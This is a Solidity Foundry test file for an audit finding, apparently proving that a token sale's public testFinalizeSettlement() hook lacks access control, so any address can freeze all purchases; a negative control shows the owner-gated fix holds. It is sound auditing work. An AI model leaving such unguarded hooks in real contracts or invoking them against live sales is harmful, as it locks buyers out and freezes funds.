// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    HarTokenSale,
    HarTokenSaleFixed,
    MiniToken,
    Buyer
} from "./63976-h-01-anyone-can-finalize-the-sale-early-via-testfinalizesett.sol";

contract AnyoneCanFinalizeSaleEarlyTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant PURCHASE_AMOUNT = 1000 ether;

    function test_exploit_anyoneFinalizesSettlement_freezesPurchases() public {
        Exploit e = new Exploit();
        e.run();

        // BEFORE the attack, a buyer purchases successfully.
        assertTrue(e.alicePurchasedOk(), "buyer purchase should succeed pre-attack");
        assertEq(e.aliceAllocation(), PURCHASE_AMOUNT, "allocation recorded pre-attack");

        // An unprivileged EOA flipped the settlement flag via the public test hook.
        assertTrue(e.settlementFinalizedFlag(), "settlement finalized by non-owner");

        // AFTER the attack, purchases revert for EVERYONE (permanent DoS).
        assertTrue(e.bobPurchaseBlocked(), "fresh buyer permanently frozen out");
        assertTrue(e.alicePurchaseBlocked(), "existing buyer permanently frozen out");

        // Harm magnitude (blocked payment) recorded on the marker to SINK.
        assertEq(e.blockedAmount(), PURCHASE_AMOUNT, "blocked payment magnitude");
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), PURCHASE_AMOUNT, "marker records frozen amount at SINK");
        assertEq(e.sinkMarkerBalance(), PURCHASE_AMOUNT, "sink marker balance");
    }

    /// @notice Negative control: with the fix (finalize gated to owner), a
    ///         non-owner attacker CANNOT freeze the sale, and purchases keep
    ///         succeeding — proving the harm is caused by the missing access
    ///         control on testFinalizeSettlement(), not by the setup.
    function test_control_ownerGatedFinalize_saleStaysLive() public {
        MiniToken pay = new MiniToken("Payment", "PAY");
        // This test contract is the deployer/owner of the fixed sale.
        HarTokenSaleFixed sale = new HarTokenSaleFixed(address(pay));

        Buyer alice = new Buyer(pay, address(sale));
        Buyer bob = new Buyer(pay, address(sale));
        pay.mint(address(alice), PURCHASE_AMOUNT);
        pay.mint(address(bob), PURCHASE_AMOUNT);
        alice.approveAll();
        bob.approveAll();

        // alice buys.
        alice.purchase(PURCHASE_AMOUNT);
        assertEq(sale.accepted(address(alice)), PURCHASE_AMOUNT, "alice buys on fixed sale");

        // A non-owner attacker attempts the freeze — it reverts (owner-gated).
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("Sale: not owner"));
        sale.testFinalizeSettlement();

        // Sale is still live: bob purchases successfully after the failed attack.
        bool bobOk = bob.tryPurchase(PURCHASE_AMOUNT);
        assertTrue(bobOk, "sale stays live under the fix");
        assertEq(sale.accepted(address(bob)), PURCHASE_AMOUNT, "bob buys post-failed-attack");
        assertFalse(sale.settlementFinalized(), "settlement not finalized by non-owner");
    }
}
